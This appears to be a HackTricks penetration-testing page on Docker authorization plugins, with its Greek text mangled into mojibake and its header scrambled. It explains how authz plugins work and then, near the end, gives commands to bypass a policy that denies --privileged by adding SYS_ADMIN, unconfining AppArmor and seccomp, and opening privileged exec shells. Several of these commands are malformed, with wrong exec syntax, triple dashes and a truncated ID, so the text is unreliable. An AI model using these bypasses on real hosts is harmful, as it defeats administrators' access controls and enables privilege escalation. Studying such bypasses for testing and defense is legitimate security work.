{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


**Î¤Î¿** out-of-the-box **Î¼Î¿Î½Ï„Î­Î»Î¿ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… Docker** ÎµÎ¯Î½Î±Î¹ **ÏŒÎ»Î± Î® Ï„Î¯Ï€Î¿Ï„Î±**. ÎŸÏ€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î­Ï‡ÎµÎ¹ Î¬Î´ÎµÎ¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿Î½ Docker daemon Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ** ÎµÎ½Ï„Î¿Î»Î® Docker client. Î¤Î¿ Î¯Î´Î¹Î¿ Î¹ÏƒÏ‡ÏÎµÎ¹ ÎºÎ±Î¹ Î³Î¹Î± Ï„Î¿Ï…Ï‚ ÎºÎ±Î»Î¿ÏÎ½Ï„ÎµÏ‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î¿ Engine API Ï„Î¿Ï… Docker Î³Î¹Î± Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎ¿Ï…Î½ Î¼Îµ Ï„Î¿Î½ daemon. Î•Î¬Î½ Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Îµ **Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿ Î­Î»ÎµÎ³Ï‡Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ **plugins ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚** ÎºÎ±Î¹ Î½Î± Ï„Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ ÏƒÏ„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï„Î¿Ï… Docker daemon ÏƒÎ±Ï‚. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± plugin ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚, Î­Î½Î±Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Docker Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î´Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎµÎ¹ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¯Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚** Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï„Î·Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿Î½ Docker daemon.

# Î’Î±ÏƒÎ¹ÎºÎ® Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ®

Î¤Î± Docker Auth plugins ÎµÎ¯Î½Î±Î¹ **ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¬** **plugins** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± **ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÏ„Îµ/Î±ÏÎ½Î·Î¸ÎµÎ¯Ï„Îµ** **ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚** Ï€Î¿Ï… Î¶Î·Ï„Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Docker Daemon **Î±Î½Î¬Î»Î¿Î³Î±** Î¼Îµ Ï„Î¿Î½ **Ï‡ÏÎ®ÏƒÏ„Î·** Ï€Î¿Ï… Ï„Î¿ Î¶Î®Ï„Î·ÏƒÎµ ÎºÎ±Î¹ Ï„Î·Î½ **ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±** **Ï€Î¿Ï… Î¶Î·Ï„Î®Î¸Î·ÎºÎµ**.

**[ÎŸÎ¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€ÏÎ¿Î­ÏÏ‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î± Î­Î³Î³ÏÎ±Ï†Î±](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

ÎŒÏ„Î±Î½ Î³Î¯Î½ÎµÏ„Î±Î¹ Î­Î½Î± **HTTP** **Î±Î¯Ï„Î·Î¼Î±** ÏƒÏ„Î¿Î½ Docker **daemon** Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… CLI Î® Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Engine API, Ï„Î¿ **Ï…Ï€Î¿ÏƒÏÏƒÏ„Î·Î¼Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚** **Ï€ÎµÏÎ½Î¬** Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î¿ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿ **plugin Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚**. Î¤Î¿ Î±Î¯Ï„Î·Î¼Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· (ÎºÎ±Î»Î¿ÏÎ½Ï„Î±) ÎºÎ±Î¹ Ï„Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ ÎµÎ½Ï„Î¿Î»Î®Ï‚. Î¤Î¿ **plugin** ÎµÎ¯Î½Î±Î¹ Ï…Ï€ÎµÏÎ¸Ï…Î½Î¿ Î³Î¹Î± Ï„Î·Î½ Î±Ï€ÏŒÏ†Î±ÏƒÎ· Î±Î½ Î¸Î± **ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹** Î® Î¸Î± **Î±ÏÎ½Î·Î¸ÎµÎ¯** Ï„Î¿ Î±Î¯Ï„Î·Î¼Î±.

Î¤Î± Î´Î¹Î±Î³ÏÎ¬Î¼Î¼Î±Ï„Î± Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¯Î±Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î±Ï€ÎµÎ¹ÎºÎ¿Î½Î¯Î¶Î¿Ï…Î½ Î¼Î¹Î± ÏÎ¿Î® ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚ ÎµÏ€Î¹Ï„ÏÎµÏ€ÏŒÎ¼ÎµÎ½Î·Ï‚ ÎºÎ±Î¹ Î±ÏÎ½Î·Ï„Î¹ÎºÎ®Ï‚:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

ÎšÎ¬Î¸Îµ Î±Î¯Ï„Î·Î¼Î± Ï€Î¿Ï… Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ plugin **Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î¿Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Ï‡ÏÎ®ÏƒÏ„Î·, Ï„Î¹Ï‚ HTTP ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ ÎºÎ±Î¹ Ï„Î¿ ÏƒÏÎ¼Î± Ï„Î¿Ï… Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚/Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚**. ÎœÏŒÎ½Î¿ Ï„Î¿ **ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·** ÎºÎ±Î¹ Î· **Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï€ÎµÏÎ½Î¿ÏÎ½ ÏƒÏ„Î¿ plugin. Î¤Î¿ Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ, **ÎºÎ±Î½Î­Î½Î±** Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î¿ **Ï‡ÏÎ®ÏƒÏ„Î·** Î® tokens Î´ÎµÎ½ Ï€ÎµÏÎ½Î¿ÏÎ½. Î¤Î­Î»Î¿Ï‚, **ÏŒÏ‡Î¹ ÏŒÎ»Î± Ï„Î± ÏƒÏÎ¼Î±Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚/Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Î±Ï€Î¿ÏƒÏ„Î­Î»Î»Î¿Î½Ï„Î±Î¹** ÏƒÏ„Î¿ plugin ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚. ÎœÏŒÎ½Î¿ ÎµÎºÎµÎ¯Î½Î± Ï„Î± ÏƒÏÎ¼Î±Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚/Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚ ÏŒÏ€Î¿Ï… Ï„Î¿ `Content-Type` ÎµÎ¯Î½Î±Î¹ ÎµÎ¯Ï„Îµ `text/*` ÎµÎ¯Ï„Îµ `application/json` Î±Ï€Î¿ÏƒÏ„Î­Î»Î»Î¿Î½Ï„Î±Î¹.

Î“Î¹Î± ÎµÎ½Ï„Î¿Î»Î­Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ±Ï„Î±Î»Î¬Î²Î¿Ï…Î½ Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· HTTP (`HTTP Upgrade`), ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `exec`, Ï„Î¿ plugin ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚ ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î¼ÏŒÎ½Î¿ Î³Î¹Î± Ï„Î± Î±ÏÏ‡Î¹ÎºÎ¬ HTTP Î±Î¹Ï„Î®Î¼Î±Ï„Î±. ÎœÏŒÎ»Î¹Ï‚ Ï„Î¿ plugin ÎµÎ³ÎºÏÎ¯Î½ÎµÎ¹ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î®, Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ· Î´ÎµÎ½ ÎµÏ†Î±ÏÎ¼ÏŒÎ¶ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ Ï…Ï€ÏŒÎ»Î¿Î¹Ï€Î· ÏÎ¿Î®. Î£Ï…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î±, Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏÎ¿Î®Ï‚ Î´ÎµÎ½ Ï€ÎµÏÎ½Î¿ÏÎ½ ÏƒÏ„Î± plugins ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚. Î“Î¹Î± ÎµÎ½Ï„Î¿Î»Î­Ï‚ Ï€Î¿Ï… ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†Î¿Ï…Î½ Ï„Î¼Î·Î¼Î±Ï„Î¹ÎºÎ® HTTP Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `logs` ÎºÎ±Î¹ Ï„Î¿ `events`, Î¼ÏŒÎ½Î¿ Ï„Î¿ HTTP Î±Î¯Ï„Î·Î¼Î± Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ ÏƒÏ„Î± plugins ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚.

ÎšÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Î·Ï‚ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚/Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚, Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÏÎ¿Î­Ï‚ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± ÎºÎ¬Î½Î¿Ï…Î½ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î± ÏƒÏ„Î¿Î½ Docker daemon. Î“Î¹Î± Î½Î± Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¸Î¿ÏÎ½ Î±Ï…Ï„Î­Ï‚ Î¿Î¹ ÏÎ¿Î­Ï‚, Ï„Î± plugins Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î½ Ï„Î¿ API Ï„Î¿Ï… daemon ÏŒÏ€Ï‰Ï‚ Î­Î½Î±Ï‚ ÎºÎ±Î½Î¿Î½Î¹ÎºÏŒÏ‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚. Î“Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÏÎ±Ï€Î¿ÏÎ½ Î±Ï…Ï„Î­Ï‚ Î¿Î¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ ÎµÏÏ‰Ï„Î®ÏƒÎµÎ¹Ï‚, Ï„Î¿ plugin Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Ï„Î± Î¼Î­ÏƒÎ± Î³Î¹Î± Î­Î½Î±Î½ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Î½Î± Î´Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎµÎ¹ ÎºÎ±Ï„Î¬Î»Î»Î·Î»ÎµÏ‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚.

## Î Î¿Î»Î»Î¬ Plugins

Î•Î¯ÏƒÏ„Îµ Ï…Ï€ÎµÏÎ¸Ï…Î½Î¿Î¹ Î³Î¹Î± **Ï„Î·Î½ ÎºÎ±Ï„Î±Ï‡ÏÏÎ¹ÏƒÎ·** Ï„Î¿Ï… **plugin** ÏƒÎ±Ï‚ Ï‰Ï‚ Î¼Î­ÏÎ¿Ï‚ Ï„Î·Ï‚ **ÎµÎºÎºÎ¯Î½Î·ÏƒÎ·Ï‚** Ï„Î¿Ï… Docker daemon. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ **Ï€Î¿Î»Î»Î±Ï€Î»Î¬ plugins ÎºÎ±Î¹ Î½Î± Ï„Î± Î±Î»Ï…ÏƒÏƒÎ¿Î´Î­ÏƒÎµÏ„Îµ**. Î‘Ï…Ï„Î® Î· Î±Î»Ï…ÏƒÎ¯Î´Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Ï„ÎµÏ„Î±Î³Î¼Î­Î½Î·. ÎšÎ¬Î¸Îµ Î±Î¯Ï„Î·Î¼Î± Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ daemon Ï€ÎµÏÎ½Î¬ Î¼Îµ ÏƒÎµÎ¹ÏÎ¬ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Î±Î»Ï…ÏƒÎ¯Î´Î±Ï‚. ÎœÏŒÎ½Î¿ ÏŒÏ„Î±Î½ **ÏŒÎ»Î± Ï„Î± plugins Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎ¿Ï…Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·** ÏƒÏ„Î¿ Ï€ÏŒÏÎ¿, Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Ï€Î±ÏÎ±Ï‡Ï‰ÏÎµÎ¯Ï„Î±Î¹.

# Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Plugins

## Twistlock AuthZ Broker

Î¤Î¿ plugin [**authz**](https://github.com/twistlock/authz) ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î±Ï€Î»ÏŒ **JSON** Î±ÏÏ‡ÎµÎ¯Î¿ Ï€Î¿Ï… Ï„Î¿ **plugin** Î¸Î± **Î´Î¹Î±Î²Î¬Î¶ÎµÎ¹** Î³Î¹Î± Î½Î± ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î®ÏƒÎµÎ¹ Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î±. ÎˆÏ„ÏƒÎ¹, ÏƒÎ±Ï‚ Î´Î¯Î½ÎµÎ¹ Ï„Î·Î½ ÎµÏ…ÎºÎ±Î¹ÏÎ¯Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï€Î¿Î»Ï ÎµÏÎºÎ¿Î»Î± Ï€Î¿Î¹Î± API endpoints Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï†Ï„Î¬ÏƒÎ¿Ï…Î½ ÏƒÎµ ÎºÎ¬Î¸Îµ Ï‡ÏÎ®ÏƒÏ„Î·.

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€Î¿Ï… Î¸Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ Alice ÎºÎ±Î¹ Bob Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½ Î½Î­Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Î£Ï„Î· ÏƒÎµÎ»Î¯Î´Î± [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î· ÏƒÏ‡Î­ÏƒÎ· Î¼ÎµÏ„Î±Î¾Ï Ï„Î·Ï‚ Î¶Î·Ï„Î¿ÏÎ¼ÎµÎ½Î·Ï‚ URL ÎºÎ±Î¹ Ï„Î·Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±Ï‚. Î£Ï„Î· ÏƒÎµÎ»Î¯Î´Î± [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î· ÏƒÏ‡Î­ÏƒÎ· Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… Î¿Î½ÏŒÎ¼Î±Ï„Î¿Ï‚ Ï„Î·Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±Ï‚ ÎºÎ±Î¹ Ï„Î·Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±Ï‚.

## Î‘Ï€Î»ÏŒÏ‚ ÎŸÎ´Î·Î³ÏŒÏ‚ Plugin

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± **ÎµÏÎºÎ¿Î»Î¿ ÏƒÏ„Î·Î½ ÎºÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· plugin** Î¼Îµ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¯Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎºÎ±Î¹ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ· ÎµÎ´Ï: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï„Î¿ `README` ÎºÎ±Î¹ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± `plugin.go` Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î½Î¿Î®ÏƒÎµÏ„Îµ Ï€ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯.

# Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Docker Auth Plugin

## ÎšÎ±Ï„Î±Î¼Î­Ï„ÏÎ·ÏƒÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚

Î¤Î± ÎºÏÏÎ¹Î± Ï€ÏÎ¬Î³Î¼Î±Ï„Î± Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ ÎµÎ¯Î½Î±Î¹ **Ï€Î¿Î¹Î± endpoints ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Î¹** ÎºÎ±Î¹ **Ï€Î¿Î¹Î± Ï„Î¹Î¼Î­Ï‚ Ï„Î¿Ï… HostConfig ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Î¹**.

Î“Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎºÎ±Ï„Î±Î¼Î­Ï„ÏÎ·ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## Î±Ï€Î±Î³Î¿ÏÎµÏ…Î¼Î­Î½Î¿ `run --privileged`

### Î•Î»Î¬Ï‡Î¹ÏƒÏ„Î± Î ÏÎ¿Î½ÏŒÎ¼Î¹Î±
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Running a container and then getting a privileged session

In this case the sysadmin **Î±Ï€Î±Î³ÏŒÏÎµÏ…ÏƒÎµ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î½Î± Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î¿ÏÎ½ Ï„ÏŒÎ¼Î¿Ï…Ï‚ ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î¼Îµ Ï„Î·Î½ ÎµÏ€Î¹Î»Î¿Î³Î® `--privileged`** Î® Î½Î± Î´Î¯Î½Î¿Ï…Î½ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± ÏƒÏ„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Î©ÏƒÏ„ÏŒÏƒÎ¿, Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± shell Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Ï„ÏÎ­Ï‡Î¿Î½ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ ÎºÎ±Î¹ Î½Î± Ï„Î¿Ï… Î´ÏÏƒÎµÎ¹ Ï„Î± ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
